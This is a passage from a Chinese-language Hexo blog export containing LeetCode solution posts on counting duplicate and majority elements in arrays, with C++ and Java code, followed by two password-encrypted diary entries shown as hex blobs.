<p>你可以假设数组是非空的，并且给定的数组总是存在多数元素。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1, 2, 3, 2, 2, 2, 5, 4, 2]</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= 数组长度 &lt;= 50000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>计数法：</p>
<p>unordered_map集合（数字为键，次数为值）存储数组中数字出现的次数，然后遍历集合查找出现次数超过数组长度一半的数字并返回。</p>
<p><strong>c++代码：</strong>(执行用时48ms，击败59.81%，内存消耗18.9M，击败5.17%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="comment">//数组长度的一半</span></span><br><span class="line">        <span class="keyword">int</span> len=nums.size()/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;</span><br><span class="line">            ++m[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历容器，查找数字</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> j:m)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j.second&gt;len)&#123;</span><br><span class="line">                <span class="keyword">return</span> j.first;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，over。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>重复N次的元素</title>
    <url>/2020/12/23/%E9%87%8D%E5%A4%8DN%E6%AC%A1%E7%9A%84%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/n-repeated-element-in-size-2n-array/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>在大小为 <code>2N</code> 的数组 <code>A</code> 中有 <code>N+1</code> 个不同的元素，其中有一个元素重复了 <code>N</code> 次。</p>
<p>返回重复了 <code>N</code> 次的那个元素。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,3,3]</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[2,1,2,5,3,2]</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[5,1,5,2,5,3,5,4]</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>4 &lt;= A.length &lt;= 10000</code></li>
<li><code>0 &lt;= A[i] &lt; 10000</code></li>
<li><code>A.length</code> 为偶数</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组A，统计不同元素出现的次数，返回次数大于1的元素。</p>
<p><strong>c++代码：</strong>(执行用时72ms，击败78.39%，内存消耗24.7M，击败29.69%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">repeatedNTimes</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:A)&#123;</span><br><span class="line">            ++m[i];</span><br><span class="line">            <span class="keyword">if</span>(m[i]&gt;<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/n-repeated-element-in-size-2n-array/solution/zhong-fu-n-ci-de-yuan-su-by-leetcode/">官方题解</a>:</h6><h4 id="方法-1：计数"><a href="#方法-1：计数" class="headerlink" title="方法 1：计数"></a>方法 1：计数</h4><p><strong>想法和算法</strong></p>
<p>直接计数元素的个数。利用 <code>HashMap</code> 或者数组，这里使用 <code>HashMap</code>。</p>
<p>然后，元素数量超过 1 的就是答案。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">repeatedNTimes</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; count = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: A) &#123;</span><br><span class="line">            count.put(x, count.getOrDefault(x, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k: count.keySet())</span><br><span class="line">            <span class="keyword">if</span> (count.get(k) &gt; <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> k;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$是 <code>A</code> 的长度。</li>
<li>空间复杂度：$O(N)$。</li>
</ul>
<p><strong>方法 2：比较</strong></p>
<p><strong>想法和算法</strong></p>
<p>一旦找到一个重复元素，那么一定就是答案。我们称这个答案为主要元素。</p>
<p>考虑所有长度为 4 的子序列，在子序列中一定至少含有两个主要元素。</p>
<p>这是因为：</p>
<p>长度为 2 的子序列中都是主要元素，或者；<br>每个长度为 2 的子序列都恰好含有 1 个主要元素，这意味着长度为 4 的子序列一定含有 2 个主要元素。<br>因此，只需要比较所有距离为 1，2 或者 3 的邻居元素即可。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">repeatedNTimes</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= <span class="number">3</span>; ++k)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length - k; ++i)</span><br><span class="line">                <span class="keyword">if</span> (A[i] == A[i+k])</span><br><span class="line">                    <span class="keyword">return</span> A[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是 <code>A</code> 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>计数法算是效率还不错的了，最近做的好多题都是用计数法做的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组中重复的数字</title>
    <url>/2020/12/23/%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/shu-zu-zhong-zhong-fu-de-shu-zi-lcof/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>找出数组中重复的数字。</p>
<p>在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[2, 3, 1, 0, 2, 5, 3]</span><br><span class="line">输出：2 或 3 </span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<p><code>2 &lt;= n &lt;= 100000</code></p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组nums，统计不同数字的次数，返回一个出现次数大于1的数字。</p>
<p><strong>c++代码：</strong>(执行用时112ms，击败48.03%，内存消耗27.2M，击败31.93%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findRepeatNumber</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;</span><br><span class="line">            ++m[i];</span><br><span class="line">            <span class="keyword">if</span>(m[i]&gt;<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-zhong-fu-de-shu-zi-lcof/solution/mian-shi-ti-03-shu-zu-zhong-zhong-fu-de-shu-zi-b-4/">官方题解</a>:</h6><p><strong>方法一：遍历数组</strong></p>
<p>由于只需要找出数组中任意一个重复的数字，因此遍历数组，遇到重复的数字即返回。为了判断一个数字是否重复遇到，使用集合存储已经遇到的数字，如果遇到的一个数字已经在集合中，则当前的数字是重复数字。</p>
<ul>
<li>初始化集合为空集合，重复的数字 repeat = -1</li>
<li>遍历数组中的每个元素：<ul>
<li>将该元素加入集合中，判断是否添加成功<ul>
<li>如果添加失败，说明该元素已经在集合中，因此该元素是重复元素，将该元素的值赋给 repeat，并结束遍历</li>
</ul>
</li>
</ul>
</li>
<li>返回 repeat</li>
</ul>
<p><strong>Java代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findRepeatNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Set&lt;Integer&gt; <span class="built_in">set</span> = <span class="keyword">new</span> HashSet&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">int</span> repeat = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">set</span>.add(num)) &#123;</span><br><span class="line">                repeat = num;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> repeat;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂性分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。遍历数组一遍。使用哈希集合（HashSet），添加元素的时间复杂度为 $O(1)$，故总的时间复杂度是 $O(n)$。</li>
<li>空间复杂度：$O(n)$。不重复的每个元素都可能存入集合，因此占用 $O(n)$额外空间。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>也是使用计数法解题，简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>Getting out of bed in winter is one of life’s hardest mission！</title>
    <url>/2021/01/04/2021-01-03/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="c310bab96bf0a3ba7ea80873d38ad2c112f4216ee16756c8a854fbf9098ae542">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec33a5d7e5317c633f8fdfb182bd5fa16062deca614740da37aba33d13ce5685ef31f601e5fe9d5e4e88d7937d8e23fead52cffe45d47f8ad15401f969d3f3d59231b4549d38a3d6cbbb3c44c027a229a0eeb1e3214acfa0446f0bc418ced17109faa60db39a7d759e0e4bc08efe258a0658bbcdf847fdee3a3831e4183981cebb2d44f3b85213ba9fc624e517d9aa6ac4f70170fd73bcf9d4d1342f6f50c59298e0dc3edfc63edcaf186c53b50954a1c0c5df297eecc23380ffb76991aac7fddf25fa7ea6519232098188da7c163eabc20d0d09980eb60092af025aabbed546efffc6b7123fabd2b2e39208b412563b8700efab836c0f310affebc0c949f0cd7beafea346da6b0be17d9c7a7973b2295657b0137fdd64e530cdfc05933a9585d0cc7ba78406b0245f1a31d488be4afcdc6479d3fc3aa4803d07205732191ea4f7bd97103b2ff556364083953564979c20e1ae56cc860d1976579127c84f3b65728eee2c7a3861596e98d190052ea11db32a1bea885f500ac04c0ec37425a69eca58f915b061e46d70eb5a756a6571b20def7cb649649bf593af6bf5b56c3a172daa02105b894a0199a4edd15895f9ab9986ede5f6b3c9c2a899d2bc550dc97407d977d881a51ed7af2ce997d0f5c9aab1acaea87d7ba08a350d9e4c60d93d12de14b2ba0dffe3b9b18be31ad13d25a5a18b7cc8970efc53991a948ccec8abb9c229bb9ce68b6004b100453d0079ed9f06debb2dd087a85af1539bde20df95a7f65a81de178852d66df434d18ecfdd248e31e6607cf552b48b5bd49ee059cbaa7e1dfd3901d02266b2a0121c3e7cbae128def533db8ddb156b6b07a4b20a802362f226ed20a615387bdcd7265e24ad046cf655226eb65bbec411ec5909d45fc0dd7d8c1553f703991a220ba094af93df5f4a0e07f081555c543549aa6362b7a4a2d61e12c9835ab09a718e5b60bd592f925f8516616d4cb93c7bd8b4dc5278e43140c6a286892ffd347b19101c4cfcbc1dfa355215309aba1b1e533df6bc6548a6b08705422a3198695263000bdfb60439138cbc5d29bc05b22504cb10a06ebb27c5650f07d7b58750ffe9800efa64e82fe4a5fbec3e4d2ff2a9ba0d4f521e776d30a68444f4af0e65c473d0a3ef7b30dd46cf0873f21eabd50de4dc236b982e11d85cc34dc76a34bee341f07374d33e9a81199cbeba37cbec9976c8bb5c3b3c21894c2adef837220d5cb3f6f1eb256efa8ddf54118fb47b97dc01ea8c3a81ca3280985ccb64192772ce1fd6daf1c597a5750a7432d31133cdafc95d001e201d234b30e31cb1eda526f91a96aae1fed3c57fde97c35cf69203e3a175efc2e4bba1eed998020b9191baaec59b4ee008ce2a02b665ae42c5750cf867e58582c9d5e835247e0e76a9cbe0145aceafaf813f1d92e668154c121a85cfdaa6678d482c29c925623276878b0ab0d4841e373e4d97f6b31047fc19184da39f3455280a503f104d757c3bd566f94260f5fff3a5eb6831b0aa4bb4eed41903a19885d55bc1857ae481e2287ad68ff350d9380c92ad9e4ed9567a8c94e7a37d36cc9c18fa92ab0c8585c4e7ecf42622ef52656aacd551993f09d06667a7f8486ec7985f5ba1cf5a486aa152a7c600d4525ce85d63166fa148111eaa6a45825bbfcafa062ed92440dd1907bed26e7fc8a9be69f367929c5e746e144af65897abc2f9231783dfa8e99b3b801898a14e21def587b230cdb58a64ba2883ab79627234cf08dc2324b49410f76dc41ebf546b67cde4ed4a6089264de283b2ba1d5a1197b5631bbcf4194cde0874743669d1cdcbc3032976f3772236ca7c8b0e9a27fd1ae44e90ca37bf71fc6cd0acda43d43b2647f6c92bebc7233f313ffb042293e7647c0012f0bb2a</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>It&#39;s better to work hard for a long time and not to suffer a whole life！</title>
    <url>/2020/12/28/2020-12-28/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="73937a8901b403867ed791314190f6e7e69073f36bcee52bad250e03f3b9bba8">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec33a5d7e5317c633f8fdfb182bd5fa16072b6319a782fc863529d706b515a06cbebe4a1b5a337a7f78a29a485a70ad6e33758376aa610ffbfc5f4b69ca274926c62834770d3cab51c8f30b36f94ee8acea4a628419e52214918ae98ef3a3b6a7585ab40f62741e8249b597ced17d79fa666d1d4d112b0468fee901870334a3f169eef16359b0628ca99579e7cfacbecb2d8dc3e490e337d8580e326803bea7719eb1e4859ac764c21e133820ecef27c6248bbf4f292a7797e7bd99d9be5c89200e2d1a9119f6f3d648c46f4da232bcd9726a1191c40ec0876c7c99243eb6b5e45d55d244b8a8359ec557e3f1429469241665ca000151a4dc9c2245d63f9df00b9217cba47795f431fd147d8c753a947dd4fabe71aae27b0e057d3309bb6b0ab071436fc28df60ade2ffd69de158e3b50b824751e51757217c53601612c88a8b1523af9ebaffdb1d2cda840a4700307423d4d8725eaa3732ca374544f6ebee5203c71303d086245d75ed45853f47f5cc1254278cc1203b16a0ef258bc71a701200c2d0fad465c13d7bec15da4fa61d6018686f8a3fcc861e7f5b51b797c5cfa38e4319163bc995d87efc8a469c3d7d478e4a7181c725c32d478003ec6b04da78b80cb62748825db6dddf2962b3c2084d7f5fb18c17f64e3aad544d3595133222f62eb56b8bac9e02b308cf5a6d46114e99a263918e16b61849b3880f6585067cbec7a8b107db71ba4dd8ce1cdf19b13d9b502500559bbe4d92fdbaf697cbf8028e2fe1adcd1bccff81874e64882d445ac200003f589ecfb0ebbba533284cbc288f525ffb60b9ea773a3f70209503769752b7941e6b54923b1be5f6317743a79a2f445be569ac77b713b79566db4b01f0d99687a740481d2ce9662b16e104796e3f6f8f6c99f17b49028337c46ed9d0f8947e857376313346ba13407d91f8dd5ef187b7370fc77cf2eba63e561012e10b7f7412b6a6036cdac826ea49d86023694e90ceee94089aa82765146858ba21b74c714b21236fb6b5a5005540e2a3345b13b2639ccb2eda6fc1bfd733a4bfaf1e9dab64dd9bacd9001663f30ef3a303221a8195f75eb7d5d2b346aec02543790c37a6e4a9498520093f8d09ae08c0a862055411176b9f1d4cf5010254b82497beeade9bd1bbc652251a4123e8177b29ce145704edec70ce89885bdf67532ef49019dc6ee9cc09ebea439a9b9fc44e448458912d80dfcbaa1b8fbef3614a8f96c7228e79ed2e79e9251dc19a578064b0699f43d2d0b2f47a81df0b9b7dc66a24ccc5b52ce841370610911d92ba86c98b13e7cb8220c14859440242b20245dafda8c0b0f052f826dcefa549d37abcc55c62e76a61ec598570f5cd74695edcfac1d838b7a77cede1608c0e0ee49405dfa8cabf81b931f5558ec8bbcec96da7213210e70d704b7ded4ec83367a90dad08486b5bdc90d3320aca41012ddecc20189e6162797358c11b4c47b5117bdf8ad35662cebbd57330c2cffd937946de7506e4d1b3dbaccc61f3aaafbed3e94bc0cde9b712cf04ebc02348fc2e59473c0e5697d8626b29f5eef262623b08ba26b83adfa8d4c43408694cc70508634b230f62d7327f111f90e1f51bdf58cb20182ce8338beffc32fa02d0ece387a4a1b011e73c7687d6bc00caba7bfa74fc7af8a1449814c3a755ae67385b810333f00d3a9e1ffdc577c13bc048dd2d0a3d431c47d390b407656b1b13c6df922221ff114526b2ef445afb3a59e7f40c1c39e0ad8025d187c2bb0fa7be874f86ec7c0058b51d3b87f4b4d127c3adcba7754a1628e6269f2539761d244b16d5c80e1139bdc2b6d007652bb08b9715138ef5c8b60a75b17158262f4f97f62ddf8677489cc6296f6b3562ba409af67d29fa6c67e3fab8fdef5178a7358b9387b90d502d4fdeee65396540409052dabd6fccb985c79a992ff518d0b1cbc1c4dca3f7adf50cd9baf843ddd76bc62e1f3c4429bfa5a884930385b60b687fb45374f3d5c8e787b10b1a6b97d2e61130d6d805ad7100cf562987cd72983f9df4b4bb7218e481ccae94a94c7139d4e7aa6866640f9749f000688ab8694bdc9bcdd845d9f0bd356c7ae400dd713cdbdc7f4203322ab3aa908e62bf7a3c6ddeaed59ff34dac768700b054cfafd0c61e401a97019222038dd9d844a1598c7d239d5bba63156cff5b99e1a10ad7445f43c5669425bbf3496a962cb27f786cfbae82dbea859680acb974b9d3a33b76ded3e7ff665271b3227bd474e2f689e4ba0fda0a591b9c040cf823fbd2d9362e496b75bdbf4f85df4732b4ff3b3c3d235abdb40bcf70ee7baba8526566e97b493729ca35eb221d45719442b69e5b9b13bd7081758a58a9c4450f13288b7df47412edab4faca8419606ef3039b0d0ff4f425201a13bf1af913f5b133549e04d5da924c6dbfaea888e982305686602700c923fcc3d88840cfa5e39f212b44dec01004a47ceca0a6df8d4787ed0734f46269e8aad350b354ac5879774def3b8e2c1850b05f83d99e10046f052d770e6236ddd7ea36294cde4ba0c55688c064fc1d511754a6ab461e7a5d2d9031bd7c60a4287b693c1d497a1bfc72aeac8f477ec42d1aa0d3b3a2a6c03b9d1ece9028566874053093435a9fce342b6992a6200552efa4a1432d0a8a0bbfca2c0db4eaff7c4a39483e80534493690dfe0ed6a1b242eead3580469e8a588315d50e981122672cc5006940d7f29cec2b3086b6031058b8912791a6dfb52a88a6ba06f4fdf78f5b2c36a37642b9f7bf890843823707b482179f34c1966849f582a7a9b2ec3c5dbe7e599218a5e58987f588582e0cbced78155a4e444a2d98dbb9211613775479a3e656d3b31bfad597ef4c5176f48c60cca6200de63193c22344f183406c5abab7cc4b5251f227701ab2887489f76395208a6f4f00bfc50e14073c186b7b16a2fd7f1f5a803db29dbef959b68f45870541b32ee2c3003a83d7f4136064b02fafb3ae9d61d13da05318f69ea30b076c96d7f4089a647b75a623b316b3dd99bf626d5a2e797df0fb620151d7651cd04229cc92bc1698f0a00c54c241974faebcbdec2a8041d2ad7e65e5ef8f1bf33f76311d63f7ecf7b98f877660f64413a288f3c41e689f7ba9993c67288b62dc2b07c24326a6df491108907fc6479890fa363e52000adcf1efe8dff05e1c3d8f847d02400c3ff9a2e9ed2ca6882cf170f917e7a9e8fdef461ad397f34456a5ef745d12bc4c48b72f63ea399a6ca8545ac7a1408d2d081be67b84e88a52eba1d3173b88b59a0e6b97f9a7323c47ac291f81a60ae2914a37579e9a80cec70d114d86fb91d8baee2d9963ab31e88437939af55a0b8440466c498f51c2eb97d63cf18c60eea8641ced04b4dfae83ca492bb716ca33cc3e6e426277981f7dfc26f2902f0bbdbd0b759a30ed4ecfa830ff9270baf34fe6e1edd720e52a61e6ffb051e7ab2cd5facd52a3d0a420fc22fac97ed5d21041b11c50a6a582d2547343eb14360804e315e118672ab7287cabfd1a29908db8cc57de6399c8cee13dd048cce07038b7cd77173945503a95e06084def0143e9e94c1445ff65bc55068b335f4f06008468fdec4f96ee75f62b2a7d5eb718d0ce8a18e38123b70d8b1bc856d0e546ffc8b51297376981c7dd5d7127621c351c7e20a4a893ed1271ba33f68bbc074db275c0aeefcc173f76a1967b6b0399c0e141cf7931cb21f6aa60a